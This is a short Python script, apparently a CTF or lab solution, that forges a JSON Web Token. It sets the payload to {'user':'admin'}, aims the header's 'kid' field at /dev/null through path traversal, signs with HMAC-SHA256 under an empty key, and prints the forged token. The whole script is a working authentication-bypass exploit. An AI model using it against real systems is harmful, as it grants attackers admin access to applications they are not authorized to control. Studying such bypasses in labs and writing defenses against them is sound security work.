#!/usr/bin/python3

import hmac,hashlib
import base64

#key
key = ""

# admin payload
admin_payload = b'{"user":"admin"}'
b64_admin_payload = base64.urlsafe_b64encode(admin_payload).decode().rstrip("=")

#header manipulate kid to /dev/null
header = b'{"typ":"JWT","alg":"HS256","kid":"/../../../../../../../../../../../../dev/null"}'
b64_header = base64.urlsafe_b64encode(header).decode().rstrip("=")

b64_data = b64_header + "." + b64_admin_payload
# sign the data by key that empty 
b64_sig = base64.urlsafe_b64encode(hmac.new(bytes(key, encoding='utf8'), b64_data.encode('utf-8'),hashlib.sha256).digest()).decode().rstrip("=")

print ("New token is " + b64_header + "." + b64_admin_payload + "." + b64_sig)
